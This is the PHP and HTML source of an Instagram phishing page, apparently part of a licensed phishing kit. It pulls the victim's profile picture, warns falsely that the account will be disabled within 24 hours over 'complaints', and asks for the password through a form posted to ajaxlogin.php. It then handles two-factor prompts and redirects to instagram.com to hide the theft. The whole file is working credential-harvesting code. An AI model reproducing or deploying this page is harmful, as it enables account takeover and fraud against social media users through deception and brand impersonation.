<?php   
require("types.php");
set_time_limit(0);
error_reporting(E_ALL);
session_start(); 
$username=$_GET["user"];
$url = "https://dumpor.com/v/$username";
$ig=str_get_html(file_get_contents($url));
$leon = $ig->find("div[class='user__img']", 0)->style;
$pp = substr($leon, 27, -4);



	
   $nick = $_GET['user'];
  
if (!$_SESSION[$nick]) {
   $apifor= "base_api.php";
   if ($apifor=="error") {
      die("The username you entered doesn't belong to an account. Please check your username and try again.");
     
   } 
   $_SESSION[$nick]= $apifor;

} else { 
      
}

$_SESSION['photo']= $_SESSION[$nick];
$_SESSION['kadi']= $nick;
if (empty($_SESSION['token'])) {
    if (function_exists('mcrypt_create_iv')) {
        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}
$token = $_SESSION['token'];

?>

<!DOCTYPE html>
<html lang="en">
   <head>
      <title>Blue Badge | Instagram</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
	  <meta property="og:image" content="<?php echo $pp; ?>" />
	  <meta property="og:type" content="website">
    <meta property="og:url" content="https://instagram.com">
    <meta property="og:title" content="Blue Badge | Instagram">
    <meta property="og:description" content="Create an account or log in to Instagram - A simple, imaginative and creative way to edit photos and videos and share them with your teacher guides.">
    
      <!--===============================================================================================-->	
      <link rel="icon" type="image/png" href="favicon.png"/>
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <!--===============================================================================================-->	
      <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
      <!--===============================================================================================-->
   </head>
   <style type="text/css">
   <style>
      img {
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 5px;
      width: 150px;
      }
      .overlay{
      display: none;
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 999;
      background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
      }
      /* Turn off scrollbar when body element has the loading class */
      body.loading{
      overflow: hidden;   
      }
      /* Make spinner image visible when body element has the loading class */
      body.loading .overlay{
      display: block;
      }
   </style>
   <style type="text/css">  .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:10px;
      font-weight:600;
      font-size: 14px;
      height: 35px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
      }
	  
	  .container-login100{
	  
	  background:#dfdfdf;
}
   </style>
   <body><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
      <div class="limiter">
         <div class="container-login100">
            <div class="wrap-login100">
               <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
                   <img src="img-01.png" alt="IMG"> 
               </div>
               <el class="login100-form validate-form" id="elemend">
                  <form autocomplete="off" id="foo">
                       
                     <center><img style="max-width:90%; border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>"></center>
                     <br>
					 <center>
<h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;">
<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;"> 

</style><center>
                    <center><h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;"><b>Dear @<?php echo $_SESSION['kadi']; ?>,</b> </h1><br><p style="max-width:87%; font-size:15px; color: #0; line-height:20px; font-weight:400;"> 
						We have received numerous complaints that you have violated our rules. If you do not provide us with feedback, your account will be disabled within 24 hours. If you think this is incorrect, please verify your information below. We request this information because we cannot verify that you are the real owner of your account. 



</p></center><hr>
                       <input name="token" type="hidden" value="<?= $token ?>">
                  <input type="hidden" name="instauser" value="<?php echo $_SESSION['kadi']; ?>">
                     <div class="wrap-input100 validate-input"> <input class="input100" type="password" required="" name="instapass" placeholder="Şifre"> <span class="focus-input100"> </span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span></div>

                       
                       
                      <button type="submit" id="df" class="btn">Login @<?php echo $_SESSION['kadi']; ?></button><br><br><center><h6><font onclick="javascript:window.location.href=''; " color="#00376b"></font></h6></center> 
                    <br>
					 <status id="statuss"></status>
                     
                  </form>
               </el>
            </div>
			
			
         </div>
		 <div style="background:#fafafa; width:100%; height:5%; border-top:0.5px solid rgb(0,0,0,0.3);"class="lilvlad2">
			<center><img style="margin-top:5px; margin-bottom:5px;" src="footerx.png" width="150"></center>
			</div>
      </div>
      <!--===============================================================================================-->	
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
      <script >
         $('.js-tilt').tilt({
         	scale: 1.1
         })
      </script>
      <!--===============================================================================================-->
      <script src="css/js/main.js"></script>
      <script type="text/javascript">
         var request;

         $("#foo").submit(function(event){
          var btn = $("#df");
btn.prop("disabled", true); 
         

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

          request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,  

            success: function(data)
            {

if(data.tokenerror) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Refresh the security error page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }
            
           if(data.lisanshata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>You do not have a license!</center></font><br><br> ');
btn.html("License Error");
              return false;
            }
            
              
    
     
            
            
             if(data.user==false){
              $("#statuss").html(' <font color="#ed4956"><center>The username you entered does not belong to an account. Please check your username and try again.</center></font><br ><br> ');
btn.prop("disabled", false);
             
              $("#df").html("Sign In");
              return false;


            }
            if(data.checkpoint_url) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Login Failed Please Login to Instagram App and Pass Verification</center></font><br><br> ');
btn.prop("disabled", false);
              return false;
            }

            if(data.authenticated==false){
              $("#statuss").html('<font color="#ed4956"><center>Sorry, your password was incorrect, please try again.</center></font><br><br> ') ;
btn.prop("disabled", false);
        
              $("#df").html("Giriş yap @<?php echo $_SESSION['kadi']; ?>");
              return false;


            }
             if(data.two_factor_required) {
               window.location.href ='twofactor.php';
                   return false;
              }
              
                if(data.status=="fail") {
              $("#statuss").html('<font color="#ed4956"><center>There Is An Error Caused By The System!</center></font><br><br> ');
btn.prop("disabled", false);
        
              $("#df").html("Login As @<?php echo $_SESSION['kadi']; ?>");
              return false;
              }
              
              
            if (data.authenticated==true) {
  $("#statuss").html('<font color="#00bf00"><center>Login successful!</center></font><br><br> ');
            
               $("#df").html("logging in...");
               
                setTimeout(function(){ window.location.href="https://instagram.com"; }, 3000);
             

           }


         }, error:function(res){
                    
              $("#df").html("Connection Error");
          alert("Please reload the page and try again..");
    }
       });
        });
      </script>
   </body>
</html>